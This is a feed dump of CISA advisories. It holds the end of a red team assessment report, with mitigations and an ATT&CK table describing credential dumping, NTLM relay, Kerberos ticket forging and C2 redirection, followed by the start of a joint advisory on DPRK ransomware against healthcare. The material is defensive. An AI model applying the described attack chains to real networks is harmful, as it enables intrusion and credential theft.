<ul><li><strong>Establish a baseline/gold-image for workstations and servers </strong>and deploy from that image [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 2.5</a>]. Use standardized groups to administer hosts in the network.</li>
</ul></td>
</tr><tr><td>
<p>Potentially unwanted programs</p>
</td>
<td>
<ul><li><strong>Implement software allowlisting</strong> to ensure users can only install software from an approved list [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 2.1</a>].</li>
<li>Remove unnecessary, extraneous software from servers and workstations.</li>
</ul></td>
</tr><tr><td>
<p>Mandatory password changes enabled</p>
</td>
<td>
<ul><li><strong>Consider only requiring changes for memorized passwords in the event of compromise</strong>. Regular changing of memorized passwords can lead to predictable patterns, and both CISA and the National Institute of Standards and Technology (NIST) recommend against changing passwords on regular intervals.</li>
</ul></td>
</tr></tbody></table><p>Additionally, CISA recommends organizations implement the mitigations below to improve their cybersecurity posture:</p>
<ul><li><strong>Provide users with regular training and exercises</strong>, specifically related to phishing emails [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 4.3</a>]. Phishing accounts for majority of initial access intrusion events.</li>
<li><strong>Enforce <a href="https://cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf" title="Implementing Phishing-Resistant MFA">phishing-resistant MFA</a></strong> to the greatest extent possible [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPGCross-Sector Cybersecurity Performance Goals 2022">CPG 1.3</a>].</li>
<li>Reduce the risk of credential compromise via the following:
<ul><li><strong>Place domain admin accounts in the protected users group</strong> to prevent caching of password hashes locally; this also forces Kerberos AES authentication as opposed to weaker RC4 or NTLM.</li>
<li><strong>Implement Credential Guard for Windows 10 and Server 2016</strong> (Refer to <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage" title="Manage Windows Defender Credential Guard">Microsoft: Manage Windows Defender Credential Guard</a> for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).</li>
<li><strong>Refrain from storing plaintext credentials in scripts</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.4</a>]. The red team discovered a PowerShell script containing plaintext credentials that allowed them to escalate to admin.</li>
</ul></li>
<li><strong>Upgrade to Windows Server 2019 or greater and Windows 10 or greater.</strong> These versions have security features not included in older operating systems.</li>
</ul><p>As a long-term effort, <strong>CISA recommends organizations prioritize implementing a more modern, <a href="https://zerotrust.cyber.gov/federal-zero-trust-strategy/" title="Federal Zero Trust Strategy">Zero Trust</a> network architecture</strong> that:</p>
<ul><li>Leverages secure cloud services for key enterprise security capabilities (e.g., identity and access management, endpoint detection and response, policy enforcement).</li>
<li>Upgrades applications and infrastructure to leverage modern identity management and network access practices.</li>
<li>Centralizes and streamlines access to cybersecurity data to drive analytics for identifying and managing cybersecurity risks.</li>
<li>Invests in technology and personnel to achieve these goals.</li>
</ul><p>CISA encourages organizational IT leadership to ask their executive leadership the question: Can the organization accept the business risk of NOT implementing critical security controls such as MFA? Risks of that nature should typically be acknowledged and prioritized at the most senior levels of an organization.</p>
<h4><strong>VALIDATE SECURITY CONTROLS</strong></h4>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol><li>Select an ATT&CK technique described in this advisory (see Table 3).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol><p>CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.</p>
<h4><strong>RESOURCES</strong></h4>
<p>See CISA’s <a href="https://github.com/cisagov/RedEye/" title="cisagov / RedEye">RedEye tool on CISA’s GitHub page</a>. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s <a href="https://www.youtube.com/watch?v=b_ARIVl4BkQ" title="Redeye - Visualizing Penetration Testing Engagements">RedEye tool overview video</a> for more information.</p>
<p>REFERENCES<br />
[1] Bleeping Computer: <a href="https://www.bleepingcomputer.com/news/microsoft/new-dfscoerce-ntlm-relay-attack-allows-windows-domain-takeover/" title="New DFSCoerce NTLM Relay attack allows Windows domain takeover">New DFSCoerce NTLM Relay attack allows Windows domain takeover</a></p>
<h4><strong>APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES</strong></h4>
<p>See Table 3 for all referenced red team tactics and techniques in this advisory. Note: activity was from Phase I unless noted.</p>
<table class="Table"><caption><em>Table 3: Red Team ATT&CK Techniques for Enterprise</em></caption>
<tbody><tr><th>
<p> </p>
</th>
<th><strong>Reconnaissance</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Gather Victim Identity Information: Email Addresses</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1589/002/" title="Gather Victim Identity Information: Email Addresses">T1589.002</a></p>
<p> </p>
</td>
<td>
<p>The team found employee email addresses via open-source research.</p>
</td>
</tr><tr><td>
<p>Gather Victim Identify Information: Employee Names</p>
<p> </p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1589/003/" title="Gather Victim Identity Information: Employee Names">T1589.003</a></p>
<p> </p>
</td>
<td>
<p>The team identified employee names via open-source research that could be used to derive email addresses.</p>
</td>
</tr><tr><td>
<p>Gather Victim Network Information: Network Security Appliances</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1590/006/" title="Gather Victim Network Information: Network Security Appliances">T1590.006</a></p>
</td>
<td>
<p>The team identified the organization’s MDM vendor and leveraged that information to move laterally to SBS-connected assets.</p>
</td>
</tr><tr><td>
<p>Gather Victim Org Information</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1591/" title="Gather Victim Org Information">T1591</a></p>
</td>
<td>
<p>The team conducted open-source research and identified an organizational branch that likely had access to an SBS asset.</p>
</td>
</tr><tr><td>
<p>Gather Victim Org Information: Determine Physical Locations</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1591/001/" title="Gather Victim Org Information: Determine Physical Locations">T1591.001</a></p>
</td>
<td>
<p>The team conducted open-source research to identify the physical locations of upkeep/management staff of selected assets.</p>
</td>
</tr><tr><td>
<p>Search Open Technical Databases: Scan Databases</p>
<p> </p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1596/005/" title="Search Open Technical Databases: Scan Databases">T1596.005</a></p>
</td>
<td>
<p>The team queried an MDM SQL database to identify target administrators who recently connected with the MDM.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Resource Development</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Acquire Infrastructure</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1583/" title="Acquire Infrastructure">T1583</a></p>
</td>
<td>
<p>The team used third-party owned and operated infrastructure throughout their assessment for C2.</p>
</td>
</tr><tr><td>
<p>Establish Accounts: Email Accounts</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1585/002/" title="Establish Accounts: Email Accounts">T1585.002</a></p>
</td>
<td>
<p>The team used commercially available email platforms for their spearphishing activity.</p>
</td>
</tr><tr><td>
<p>Obtain Capabilities: Tool</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1588/002/" title="Obtain Capabilities: Tool">T1588.002</a></p>
</td>
<td>
<p>The team used the following tools:</p>
<ul><li><a href="https://attack.mitre.org/versions/v12/software/S0154/">Cobalt Strike</a> and Merlin payloads for C2.</li>
<li><a href="https://github.com/GhostPack/KeeThief">KeeThief</a> to obtain a decryption key from a KeePass database</li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> and <a href="https://github.com/Wh04m1001/DFSCoerce">DFSCoerce</a> in an NTLM relay attack</li>
</ul></td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Initial Access</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Phishing: Spearphishing Link</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1566/002/" title="Phishing: Spearphishing Link">T1566.002</a></p>
</td>
<td>
<p>The team sent spearphishing emails with links to a red-team-controlled domain to gain access to the organization’s systems.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Execution</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Native API</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1106/" title="Native API">T1106</a></p>
</td>
<td>
<p>The team created a policy via the MDM API, which downloaded and executed a payload on a workstation.</p>
</td>
</tr><tr><td>
<p>User Execution</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1204/" title="User Execution">T1204</a></p>
</td>
<td>
<p>Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Persistence</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
<p> </p>
</td>
</tr><tr><td>
<p>Account Manipulation</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1098/" title="Account Manipulation">T1098</a></p>
</td>
<td>
<p>The team elevated account privileges to administrator and modified the user’s account by adding Create Policy and Delete Policy permissions.</p>
<p>During Phase II, the team created local admin accounts and an AD account; they added the created AD account to a domain admins group.</p>
</td>
</tr><tr><td>
<p>Create Account: Local Account</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1136/001/" title="Create Account: Local Account">T1136.001</a></p>
</td>
<td>
<p>During Phase II, the team created a local administrator account on a workstation and a server.</p>
</td>
</tr><tr><td>
<p>Create Account: Domain Account</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1136/002" title="Create Account: Domain Account">T1136.002</a></p>
</td>
<td>
<p>During Phase II, the team created an AD account.</p>
</td>
</tr><tr><td>
<p>Create or Modify System Process: Windows Service</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1543/003/" title="Create or Modify System Process: Windows Service">T1543.003</a></p>
</td>
<td>
<p>During Phase II, the team leveraged compromised workstation and domain admin accounts to execute a payload via Windows Service Creation on target workstations and the DC.</p>
</td>
</tr><tr><td>
<p>Event Triggered Execution: Windows Management Instrumentation Event Subscription</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1546/003/" title="Event Triggered Execution: Windows Management Instrumentation Event Subscription">T1546.003</a></p>
</td>
<td>
<p>The team used WMI Event Subscriptions to move laterally between sites.</p>
</td>
</tr><tr><td>
<p>Hijack Execution Flow: DLL Search Order Hijacking</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1574/001/" title="Hijack Execution Flow: DLL Search Order Hijacking">T1574.001</a></p>
</td>
<td>
<p>The team used DLL hijacking to move laterally between sites.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Privilege Escalation</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Abuse Elevation Control Mechanism</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1548/" title="Abuse Elevation Control Mechanism">T1548</a></p>
</td>
<td>
<p>The team elevated user account privileges to administrator by modifying the user’s account via adding Create Policy and Delete Policy permissions.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Defense Evasion</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Valid Accounts: Domain Accounts</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1078/002/" title="Valid Accounts: Domain Accounts">T1078.002</a></p>
</td>
<td>
<p>During Phase II, the team compromised a domain admin account and used it to laterally to multiple workstations and the DC.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Credential Access</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>OS Credential Dumping: LSASS Memory</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1003/001/" title="OS Credential Dumping: LSASS Memory">T1003.001</a></p>
</td>
<td>
<p>The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called <a href="https://github.com/helpsystems/nanodump">nanodump</a>, exporting the output and processing the output offline with <a href="https://attack.mitre.org/versions/v12/software/S0002/">Mimikatz</a>.</p>
</td>
</tr><tr><td>
<p>OS Credential Dumping: DCSync</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1003/006/" title="OS Credential Dumping: DCSync">T1003.006</a></p>
</td>
<td>
<p>The team harvested AES-256 hashes via DCSync.</p>
</td>
</tr><tr><td>
<p>Brute Force: Password Cracking</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1110/002/" title="Brute Force: Password Cracking">T1110.002</a></p>
</td>
<td>
<p>The team cracked a user’s workstation account password after learning the user’s patterns from plaintext credentials.</p>
</td>
</tr><tr><td>
<p>Unsecured Credentials</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1552/" title="Unsecured Credentials">T1552</a></p>
</td>
<td>
<p>The team found backups of a MySQL database that contained the encryption key needed to decrypt SSH passwords.</p>
</td>
</tr><tr><td>
<p>Unsecured Credentials: Credentials in Files</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1552/001/" title="Unsecured Credentials: Credentials in Files">T1552.001</a></p>
</td>
<td>
<p>The team found plaintext credentials to an API user account stored in PowerShell scripts on an MDM server.</p>
</td>
</tr><tr><td>
<p>Unsecured Credentials: Bash History</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1552/003/" title="Unsecured Credentials: Bash History">T1552.003</a></p>
</td>
<td>
<p>The team found bash history files on a Workstation 5, and the files appeared to be SSH passwords saved in bash history.</p>
</td>
</tr><tr><td>
<p>Credentials from Password Stores: Password Managers</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1555/005/" title="Credentials from Password Stores: Password Managers">T1555.005</a></p>
</td>
<td>
<p>The team pulled credentials from a KeePass database.</p>
<p> </p>
</td>
</tr><tr><td>
<p>Adversary-in-the-middle: LLMNR/NBT-NS Poisoning and SMB Relay</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1557/001/" title="Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay">T1557.001</a></p>
</td>
<td>
<p>The team ran the <a href="https://github.com/Wh04m1001/DFSCoerce">DFSCoerce</a> python script, which prompted DC authentication to a server using the server’s NTLM hash. The team then deployed <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> to capture the incoming DC TGT.</p>
</td>
</tr><tr><td>
<p>Steal or Forge Kerberos Tickets: Golden Ticket</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1558/001/" title="Steal or Forge Kerberos Tickets: Golden Ticket">T1558.001</a></p>
</td>
<td>
<p>The team used the acquired krbtgt account hash throughout their assessment to forge legitimate TGTs.</p>
</td>
</tr><tr><td>
<p>Steal or Forge Kerberos Tickets: Kerberoasting</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1558/003/" title="Steal or Forge Kerberos Tickets: Kerberoasting">T1558.003</a></p>
</td>
<td>
<p>The team leveraged <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> and <a href="https://github.com/Wh04m1001/DFSCoerce">DFSCoerce</a> in a NTLM relay attack to obtain the DC’s TGT from a host with Unconstrained Delegation enabled.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Discovery</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>System Network Configuration Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1016/" title="System Network Configuration Discovery">T1016</a></p>
</td>
<td>
<p>The team queried the AD for information about the network's sites and subnets. </p>
</td>
</tr><tr><td>
<p>Remote System Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1018/" title="Remote System Discovery">T1018</a></p>
</td>
<td>
<p>The team queried the AD, during phase I and II, for information about computers on the network. </p>
</td>
</tr><tr><td>
<p>System Network Connections Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1049/" title="System Network Connections Discovery">T1049</a></p>
</td>
<td>
<p>The team listed existing network connections on SCCM Server 1 to reveal an active SMB connection with server 2.</p>
</td>
</tr><tr><td>
<p>Permission Groups Discovery: Domain Groups</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1069/002/" title="Permission Groups Discovery: Domain Groups">T1069.002</a></p>
</td>
<td>
<p>The team leveraged ldapsearch and dsquery to query and scrape active directory information. </p>
</td>
</tr><tr><td>
<p>Account Discovery: Domain Account</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1087/002/" title="Account Discovery: Domain Account">T1087.002</a></p>
</td>
<td>
<p>The team queried AD for AD users (during Phase I and II), including for members of a SharePoint admin group and several standard user accounts with administrative access.</p>
</td>
</tr><tr><td>
<p>Cloud Infrastructure Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1580/" title="Cloud Infrastructure Discovery">T1580</a></p>
</td>
<td>
<p>The team found SecOps network diagrams on a host detailing cloud infrastructure boundaries.</p>
</td>
</tr><tr><td>
<p>Domain Trust Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1482/" title="Domain Trust Discovery">T1482</a></p>
</td>
<td>
<p>During Phase II, the team enumerated trust relationships within the AD Forest.</p>
</td>
</tr><tr><td>
<p>Group Policy Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1615/" title="Group Policy Discovery">T1615</a></p>
</td>
<td>
<p>The team scraped AD information, including GPOs.</p>
</td>
</tr><tr><td>
<p>Network Service Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1046/" title="Network Service Discovery">T1046</a></p>
</td>
<td>
<p>During Phase II, the team enumerated ports on target systems from a previously compromised workstation.</p>
</td>
</tr><tr><td>
<p>System Owner/User Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1033/" title="System Owner/User Discovery">T1033</a></p>
</td>
<td>
<p>During Phase II, the team enumerated the AD for current session information from every domain computer (Workstation and Server).</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Lateral Movement</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Remote Services: SMB/Windows Admin Shares</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1021/002/" title="8Remote Services: SMB/Windows Admin Shares">T1021.002</a></p>
</td>
<td>
<p>The team moved laterally with an SMB beacon.</p>
<p>During Phase II, they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC.</p>
</td>
</tr><tr><td>
<p>Use Alternate Authentication Material: Pass the Hash</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1550/002/" title="Use Alternate Authentication Material: Pass the Hash">T1550.002</a></p>
</td>
<td>
<p>The team ran the <a href="https://github.com/Wh04m1001/DFSCoerce">DFSCoerce</a> python script, which prompted DC authentication to a server using the server’s NTLM hash. The team then deployed <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> to capture the incoming DC TGT.</p>
</td>
</tr><tr><td>
<p>Pass the Ticket</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1550/003/" title="Pass the Ticket">T1550.003</a></p>
</td>
<td>
<p>The team used the asktgt command to impersonate accounts for which they had credentials by requesting account TGTs.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Command and Control</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Application Layer Protocol</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1071/" title="Application Layer Protocol">T1071</a></p>
</td>
<td>
<p>The team remotely enumerated the local administrators group on target hosts to find valid user accounts. This technique relies on anonymous SMB pipe binds, which are disabled by default starting with Server 2016.</p>
<p>During Phase II, the team established sessions that originated from a target Workstation and from the DC directly to an external host over a clear text protocol.</p>
</td>
</tr><tr><td>
<p>Application Layer Protocol: Web Protocols</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1071/001/" title="Application Layer Protocol: Web Protocols">T1071.001</a></p>
</td>
<td>
<p>The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic.</p>
</td>
</tr><tr><td>
<p>Application Layer Protocol: File Transfer Protocols</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1071/002/" title="Application Layer Protocol: File Transfer Protocols">T1071.002</a></p>
</td>
<td>
<p>The team used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers.</p>
</td>
</tr><tr><td>
<p>Encrypted Channel</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1573/" title="Encrypted Channel">T1573</a></p>
</td>
<td>
<p>The team’s C2 traffic was encrypted in transit using encryption keys stored on their C2 servers.</p>
</td>
</tr><tr><td>
<p>Ingress Tool Transfer</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1105/" title="Ingress Tool Transfer">T1105</a></p>
</td>
<td>
<p>During Phase II, the team uploaded and executed well-known malicious files to the DC to generate host-based alerts.</p>
</td>
</tr><tr><td>
<p>Proxy: External Proxy</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1090/002/" title="Proxy: External Proxy">T1090.002</a></p>
</td>
<td>
<p>The team used redirectors to redirect C2 traffic between the target organization’s network and the team’s C2 servers.</p>
</td>
</tr><tr><td>
<p>Proxy: Domain Fronting</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1090/004/" title="Proxy: Domain Fronting">T1090.004</a></p>
</td>
<td>
<p>The team used domain fronting to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating.</p>
</td>
</tr><tr><th>
<p> </p>
</th>
<th><strong>Impact</strong></th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Account Access Removal</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1531/" title="Account Access Removal">T1531</a></p>
</td>
<td>
<p>During Phase II, the team locked out several administrative AD accounts.</p>
</td>
</tr></tbody></table><p> </p>
<p>Please share your thoughts. We recently updated our anonymous <a href="https://www.surveymonkey.com/r/CISA-cyber-survey?product=%5bproduct_value%5d" title="Survey">Product Feedback</a> Survey and we'd welcome your feedback.</p>

## pubDate
Fri, 24 Feb 2023 14:04:05 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17470
## -
## title
#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-040a
## description
<h4><strong>SUMMARY</strong></h4>
<p><strong>Note:</strong> This Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and various ransomware threat actors. These #StopRansomware advisories detail historically and recently observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit <a href="https://www.cisa.gov/stopransomware">stopransomware.gov</a> to see all #StopRansomware advisories and to learn about other ransomware threats and no-cost resources.</p>
<p>The United States National Security Agency (NSA), the U.S. Federal Bureau of Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Department of Health and Human Services (HHS), the Republic of Korea (ROK) National Intelligence Service (NIS), and the ROK Defense Security Agency (DSA) (hereafter referred to as the “authoring agencies”) are issuing this joint Cybersecurity Advisory (CSA) to highlight ongoing ransomware activity against <a href="https://www.cisa.gov/healthcare-and-public-health-sector">Healthcare and Public Health Sector</a> organizations and other <a href="https://www.cisa.gov/critical-infrastructure-sectors">critical infrastructure sector</a> entities.</p>
<p>This CSA provides an overview of Democratic People’s Republic of Korea (DPRK) state-sponsored ransomware and updates the July 6, 2022, joint CSA <a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-187a">North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector</a>. This advisory highlights TTPs and IOCs DPRK cyber actors used to gain access to and conduct ransomware attacks against Healthcare and Public Health (HPH) Sector organizations and other critical infrastructure sector entities, as well as DPRK cyber actors’ use of cryptocurrency to demand ransoms.</p>
<p>The authoring agencies assess that an unspecified amount of revenue from these cryptocurrency operations supports DPRK national-level priorities and objectives, including cyber operations targeting the United States and South Korea governments—specific targets include Department of Defense Information Networks and Defense Industrial Base member networks. The IOCs in this product should be useful to sectors previously targeted by DPRK cyber operations (e.g., U.S. government, Department of Defense, and Defense Industrial Base). The authoring agencies highly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.</p>
<p>For additional information on state-sponsored DPRK malicious cyber activity, see CISA’s <a href="https://www.cisa.gov/uscert/northkorea">North Korea Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report: <a href="https://media.defense.gov/2023/Feb/09/2003159161/-1/-1/0/CSA_RANSOMWARE_ATTACKS_ON_CI_FUND_DPRK_ACTIVITIES.PDF">pdf</a>, 661 kb.</p>
<p>For a downloadable copy of IOCs, see</p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-02/aa23-040a.stix_.xml" class="c-file__link" target="_blank">AA23-040A STIX XML</a>
    <span class="c-file__size">(XML,       196.24 KB
  )</span>
  </div>
</div>
<p><strong>TECHNICAL DETAILS</strong></p>
<p><strong>Note:</strong> This advisory uses the <a href="https://attack.mitre.org/versions/v12/matrices/enterprise" title="Enterprise Matrix">MITRE ATT&CK for Enterprise</a> framework, version 12. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.</p>
<p>This CSA is supplementary to previous reports on malicious cyber actor activities involving DPRK ransomware campaigns—namely <a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-187a" title="North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector">Maui</a> and <a href="https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/" title="North Korean threat actor targets small and midsize businesses with H0lyGh0st ransomware">H0lyGh0st</a> ransomware. The authoring agencies are issuing this advisory to highlight additional observed TTPs DPRK cyber actors are using to conduct ransomware attacks targeting South Korean and U.S. healthcare systems.</p>
<h5><em>Observable TTPs</em></h5>
<p>The TTPs associated with DPRK ransomware attacks include those traditionally observed in ransomware operations. Additionally, these TTPs span phases from acquiring and purchasing infrastructure to concealing DPRK affiliation:</p>
<ul><li><strong>Acquire Infrastructure [<a href="https://attack.mitre.org/techniques/T1583" title="Acquire Infrastructure">T1583</a>]</strong>. DPRK actors generate domains, personas, and accounts; and identify cryptocurrency services to conduct their ransomware operations. Actors procure infrastructure, IP addresses, and domains with cryptocurrency generated through illicit cybercrime, such as ransomware and cryptocurrency theft.</li>
<li><strong>Obfuscate Identity</strong>. DPRK actors purposely obfuscate their involvement by operating with or under third-party foreign affiliate identities and use third-party foreign intermediaries to receive ransom payments.</li>
